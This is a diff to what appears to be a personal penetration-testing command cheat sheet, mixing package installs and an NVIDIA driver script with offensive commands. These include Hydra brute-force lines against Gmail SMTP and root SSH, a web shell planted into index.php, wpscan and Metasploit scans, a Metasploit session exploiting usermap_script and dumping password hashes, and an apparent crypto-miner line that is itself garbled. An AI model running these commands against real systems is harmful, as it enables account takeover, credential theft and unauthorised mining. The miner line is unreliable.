@@ -43,6 +43,7 @@ find . -iname "*.sql" | while read -r x; do cat $x | grep "apiKey"; done
     sudo apt install websploit
     sudo apt install onesixtyone
     sudo apt install libxml2
+    sudo apt install xsltproc #< xsltproc targetoutput.xml -o targetoutput.html
     sudo apt-get install libio-socket-socks-perl
     sudo apt-get install bleachbit
     sudo gem install bundler && bundle config set --local without 'test'
@@ -50,6 +51,7 @@ find . -iname "*.sql" | while read -r x; do cat $x | grep "apiKey"; done
     sudo apt install bacula-sd
     sudo apt-get install xclip -y
     sudo apt-get install python3 python-dev python3-dev build-essential libssl-dev libffi-dev libxml2-dev libxslt1-dev zlib1g-dev
+    sudo apt  install youtube-dl
     cpanm Net::SSH::Perl
     sudo cpan -i Net::Whois::IP
     PIP: ------------------------
@@ -66,6 +68,7 @@ find . -iname "*.sql" | while read -r x; do cat $x | grep "apiKey"; done
     pip3 install cachetools==4.2.2 --user
     pip3 install PyTelegramBotAPI==2.2.3
     pip3 install dotenv
+    sudo pip3 install bandit
     Script: ---------------------
     #Hydra Brute Force Gmail : hydra smtp.gmail.com smtp -l xx@gmail.com -P /opt/backbox/warlist/pwd.lst -s 465 -S -v -V
     #Hydra Brute Force SSH : hydra -t 64 -l root -V -x '4:4:aA1"@#$!()=`~?><;:%^&*_-+/,.\ ' IP ssh
@@ -134,6 +137,7 @@ find . -iname "*.sql" | while read -r x; do cat $x | grep "apiKey"; done
     getent hosts target.com | awk '{ print $1 }'
     nslookup target.com | awk '/^Address: / { print $2 }'
     php -r "echo gethostbyname('target.com');"
+    tor-resolve -5 -v www.target.com 127.0.0.1:9050
     Script_END: ---------------------
     
 #### Garbage CMD :
@@ -158,9 +162,19 @@ find . -iname "*.sql" | while read -r x; do cat $x | grep "apiKey"; done
     sudo snap install go --classic
     #
     python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
+    sudo fuser -vk 80/tcp
+    echo terceS | mkpasswd -s -H MD5
+    hash -d pip
+    sudo docker run -it --rm wpscanteam/wpscan --url https://target.com/ --no-banner --random-user-agent
+    #Fix error bus registering with the accessibility bus : 
+    terminal > export NO_AT_BRIDGE=1
     
 #### MSF / MSV CMD :
-
+    
+    db_connect --name local-https-data-service --token KEY_HERE --cert ~/.msf4/msf-ws-cert.pem --skip-verify https://localhost:5443
+    db_nmap -Pn -sTV -T4 --open --min-parallelism 64 --version-all IP -p -
+    spool /home/oglinux/.msf4/logs/logs.txt
+    spool off
     cd /opt/metasploit-framework/embedded/framework/tools/exploit
     ruby pattern_offset.rb -q 21312421
     ruby pattern_offset.rb -l 336 -q 21312421
@@ -175,6 +189,32 @@ find . -iname "*.sql" | while read -r x; do cat $x | grep "apiKey"; done
     cat shell.php | bcopy && echo '<?php ' | tr -d '\n' > index.php && pbpaste >> index.php 
     i686-w64-mingw32-gcc ssi.c -o ssi32x2.exe
     sudo grep -r LD_PRELOAD /etc $HOME
+    bash -o stratum+tcp://mine.cc.st:3333 -0 geox.1:x -B
+    sysctl -w net.ipv4.ip_forward=1
+    ----
+    msf  exploit(usermap_script) > exploit
+    Background session 1? [y/N]  y
+    msf > creds
+    msf  exploit(usermap_script) > use post/linux/gather/hashdump
+    msf  post(hashdump) > sessions -l
+    msf  post(hashdump) > run
+    msf  post(hashdump) > loot
     
     
-    
+#### install nvidia - linux cmd : 
+```bash
+    #!/usr/bin/bash
+    #sudo add-apt-repository ppa:graphics-drivers
+    #sudo apt-get update
+    sudo apt install nvidia-cuda-dev nvidia-cuda-toolkit 
+    udd=$(ubuntu-drivers devices)
+    echo "$udd\n"
+    sudo lspci -v -s 01:00.0
+    sleep 4.0 
+    read -p "Type [ OK ] to restart, hit CTRL+ALT+DEL after 4 second\n close everything it will reset your computer\nwhen you ready hit " readnow
+    sudo systemctl isolate multi-user.target
+  
+    # edit /etc/default/grub
+    # modify GRUB_CMDLINE_LINUX_DEFAULT in order to add "amdgpu.vm_fragment_size=9" (without the quotes). The line may look something #like this after the change:
+    #GRUB_CMDLINE_LINUX_DEFAULT="quiet splash amdgpu.vm_fragment_size=9"
+````
